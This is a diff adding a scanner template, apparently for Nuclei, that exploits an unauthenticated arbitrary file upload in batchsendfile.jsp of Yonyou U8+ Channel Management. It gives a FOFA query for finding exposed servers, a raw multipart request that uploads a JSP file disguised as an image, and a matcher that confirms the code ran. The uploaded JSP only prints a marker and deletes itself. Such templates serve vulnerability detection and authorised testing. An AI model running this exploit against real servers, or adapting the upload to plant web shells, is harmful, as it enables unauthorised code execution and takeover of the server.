@@ -1,0 +1,39 @@
+id: Yonyou-U8-Channel-management-batchsendfile-File-upload
+
+info:
+  name: 用友U8+渠道管理(高级版) batchsendfile.jsp 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa:"common/images/dot.gif" && (icon_hash="737647198" || icon_hash="84729000")
+    用友U8+渠道管理(高级版) batchsendfile.jsp 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference: 
+    -
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |-
+        POST /business/common/lxgzds/batchsendfile.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - 'status_code==200 && contains_all(body,"{{username}}")'
